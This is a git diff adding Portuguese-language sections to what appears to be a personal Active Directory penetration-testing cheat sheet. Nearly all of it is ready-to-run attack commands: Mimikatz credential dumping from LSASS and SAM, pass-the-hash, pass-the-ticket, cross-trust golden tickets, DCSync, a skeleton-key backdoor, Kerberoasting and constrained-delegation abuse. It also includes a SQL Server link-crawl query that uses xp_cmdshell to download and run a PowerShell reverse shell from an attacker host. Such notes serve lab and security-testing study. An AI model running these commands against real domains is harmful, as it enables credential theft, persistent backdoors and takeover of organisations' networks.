@@ -76,6 +76,8 @@ Nota-se que todos os comandos aqui são dados a partir de máquinas windows para
             - [DCSync](#dcsync)
             - [Skeleton Key](#skeleton-key)
             - [Kerberoast](#kerberoast)
+            - [Constrained Delegation](#constrained-delegation)
+            - [Unconstrained Delegation](#unconstrained-delegation)
         - [Tickets](#tickets)
             - [Golden Ticket](#golden-ticket)
             - [Silver Ticket](#silver-ticket)
@@ -427,41 +429,245 @@ dominio.local - Get-DomainSID -Domain dominio.local
 
 ### PowerView_dev
 
-```powershell
+O PowerView_dev, pessoalmente, eu só utilizei em uma situação até hoje (sei que há muitas oturas funcionalidades nele, tenho que explorar mais)
 
+A funcionalidade que encontrei para ele foi para identificar `Constrained Delegation` habilitada, o comando é esse:
+
+```powershell
+Get-DomainUser -TrustedToAuth
 ```
 
 ### AD Module
 
+Aqui eu faço depois, não costumo usar o AD Module muito.
+
 ### BloodHound
+
+Para a instalação dele na Kali, digite os comandos:
+
+```bash
+sudo apt-get install neo4j
+sudo apt-get install bloodhound
+
+# Apos finalizar a instalação, inicie a aplicação
+
+neo4j console
+bloodhound
+
+# Mude a senha do neo4j (a padrão inicial não vai entrar)
+#E arraste o *.zip pra dentro do bloodhound
+```
+
+Acesse esse blog para mais informações!
+
+[BloodHound Tutorial](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
+
+Comandos para criação do .zip
+
+```powershell
+Import-Module ./SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All,loggedon
+```
 
 ## MSSQL
 
+Aqui iremos explorar um pouco o banco de dados do Active Directory!
+
 ### PoweUpSQL
+
+[PowerUpSQL Tutorial](https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/)
+
+Comandos
+
+```powershell
+# Carregando o modulo
+Import-Module PowerUpSQL.ps1
+
+# Listar todos os SPN
+Get-SQLInstanceDomain -Verbose
+
+# Testando conectividade
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq "Accessible"}
+
+# Verificando as cadeias de links que elas tem
+Get-SQLInstanceDomain | Get-SQLServerLink
+
+# Realizando o crawl dentro dos links
+# Agora vamos fazer crawl por todo os links e vemos que temos uma cadeia boa de links por todos os servidores sql
+
+Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Verbose 
+
+# Executando comandos através da chain
+# Uma vez que temos acesso a chain, agora podemos executar comandos dentro dela (ou pelo menos tentar)
+
+Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Query "exec master..xp_cmdshell 'whoami'" | ft
+
+# Reverse shell, lembrar de deixar o HFS e o powercat aberto
+
+Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://meu.ip/Invoke-PowerShellTcp.ps1'')'" | ft
+```
+
+Esses foram os principais comandos que me lembrei do PowerUPSql!
 
 ### HeidiSQL
 
+O HeidiSQL é mais simples, apenas colocar a database que eu tenho acesso através do powerupsql, e deixar o login do próprio windows (lembrando que eu devo ter acesso público, pelo menos, pra entrar nela) 
+
+```powershell
+# Testando conectividade
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq "Accessible"}
+```
+
+Com o acesso público nós conseguimos escalar privilégios pra 'sa', mas isso eu deixo pra depois pra explicar melhor as técnicas de se fazer isso!
+
 ## Mimikatz
 
-### Recon
+Essa parte é importante, mimikatz é uma das melhores ferramentas para exploração em ambiente AD!
 
 #### Dumps
 
+*Dump do Sam (lsadump::sam)→ Local Administrator Hash*
+
+*LogonPasswords (sekurlsa::logonpasswords) → Domain Administrator Hash (Para acessar outras máquinas dentro do domínio)*
+
 #### Hashes
+
+```powershell
+# Pegar hash de usuários
+
+./mimikatz.exe lsadump::lsa /patch
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' 
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "lsadump::sam" "exit"'
+```
 
 ### Ataques
 
 #### Pass-The-Hash
 
+```powershell
+./mimikatz.exe sekurlsa::pth /user:USUÁRIO /domain:DOMINIO /ntlm:HASH_NTLM_EXTRAIDO /run:powershell.exe
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:USUÁRIO /domain:DOMINIO /ntlm:HASH_NTLM_EXTRAIDO /run:powershell.exe'
+```
+
 #### Pass-The-Ticket
+
+Esse eu utilizo muito no [Unconstrained Delegation](#Unconstrained-Delegation), mas tem outras aplicações também
+
+```powershell
+# Primeiro devemos ver quais máquinas tem o Uncosntrained Habilitado
+Get-NetComputer -UnConstrained | select Name
+
+# Com essa informação, exportamos o ticket dentro da máquina que apareceu no comando anterior (aqui eu cirei uma seção nela, mas pode ser feito direto tbm)
+Invoke-Command -ScriptBlock {Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export"'} -Session $sess
+
+# Após termos extraidos todos os tickets, vemos qual é interessante de se reutilizar, aqui tem que esperar algm DA ou algum usuário específico logar na máquina pra ser criado o ticket de seção pra ele, e então injetamos na seção
+Invoke-Command -ScriptBlock{Invoke-Mimikatz -Command '"kerberos:: ptt [...]"'} -Session $sess
+
+# Agora acessamos a máquina que não tinhamos acesso antes
+Invoke-Command -Scriptblock{ls \\MÁQUINA.QUE.NÃO.TINHA.ACESSO.SEM.O.TICKET.local\C$} -session $sess
+```
+
+Depois especifico melhor na aba do [Unconstrained Delegation](#Unconstrained-Delegation) (ou não!)
 
 #### Privilege Across Trusts
 
+Na bucha é um Golden Ticket, mas através do trusts dos domains
+
+```powershell
+# Aqui ele vai criar o ticket e ja injetar na seção
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:AB.DOMINIO.local /sid:<SID do AB.DOMINIO.local> /krbtgt:KRBTGT_NTLM /sids:<SID do DOMINIO.local> /ptt"'
+
+# AB.DOMINIO.local - Get-DomainSID
+# DOMINIO.local - Get-DomainSID -Domain DOMINIO.local
+```
+
+Agora vamos ter acesso ao DOMINIO.local através do AB.DOMINIO.local
+
 #### DCSync
+
+```powershell
+# Sempre lembrar do privilege::debug e do token::elevate
+Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:AB.DOMINIO.local /user:Administrator" "exit"
+```
+
+Assim pegamos o hash do Administrator, pra depois podermos fazer o pth e conseguir acesso às outras máquinas!
 
 #### Skeleton Key
 
+```powershell
+# Só consegui fazer funcionar com o executável dele
+./mimkatz.exe
+privilege::debug
+token::elevate
+misc::skeleton
+```
+
+A senha de acesso pra todas as máquinas vai ser `administrator:mimikatz`
+
 #### Kerberoast
+
+Mais informações de como esse ataque funciona você encontra no meu blog [Kerberoast](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)
+
+Agora conseguimos senhas em claro de usuários, podemos setar SPN também pra alguns usuários
+
+```powershell
+setspn -a MSSQLSvc/AB.DOMINIO.local USUARIO_COM_PRIVILEǴIOS
+```
+
+Caso já tenhamos usuários setados como SPN, esses são os comandos pra extrair o hash e depois quebrar
+
+```powershell
+# Primeiro passo é verificar quais contas estão com o SPN habilitado
+Get-NetUser -SPN
+
+# Agora devemos requisitar um ticket do SPN
+Request-SPN Ticket MSSQLSvc/AB.DOMINIO.local
+
+# Extrair o ticket
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Agora na kali extrair o hash dela pra quebrar com o john
+kibi2john.py
+```
+
+#### Constrained Delegation
+
+Mais informações de como esse ataque funciona você encontra no meu blog [Constrained](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)
+
+Aqui vão somentes os comandos pra facilitar a vida do atacante
+
+```powershell
+# Importamos o PowerView_dev
+Import-Module PowerView_dev.ps1
+
+# Verificamos por máquinas com o Constrained Delegation habilitado, vai aparecer usuários com essa permissão, caso tenha
+Get-DomainUser -TrustedToAuth
+
+# Com o hash do usuário (extraimos com o mimikatz) e o rubeus, requisitamos os tickets necessários, TGT
+./kekeo.exe
+tgt::ask /user:USER_COM_CONSTRAINED /domain:AB.DOMINIO.local /ntlm:HASH_NTLM_DO_USER_COM_CONSTRAINED /ticket:QUALQUER_COISA.kirbi
+
+# Agora solicitamos o TGS
+./kekeo.exe
+tgs::s4u /tgt:QUALQUER_COISA.kirbi /user:Administrator@AB.DOMINIO.local /service:time/MAQUINA.AB.DOMINIO.local|cifs/MAQUINA.AB.DOMINIO.local
+
+# Agora com o mimikatz injetamos o ticket na seção
+Invoke-Mimikatz -Command '"kerberos::ptt tickets_gerados.kirbi"'
+```
+
+E teremos acesso à máquina com o Constrained Delegation habilitado
+
+#### Unconstrained Delegation
+
+Mais informações de como esse ataque funciona você encontra no meu blog [Unconstrained](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)
+
 
 ### Tickets
 
@@ -473,3 +679,13 @@ dominio.local - Get-DomainSID -Domain dominio.local
 
 ##### HOST
 
+
+## Referencias
+
+Bloodhound
+
+https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/
+
+PowerUpSQL
+
+https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/
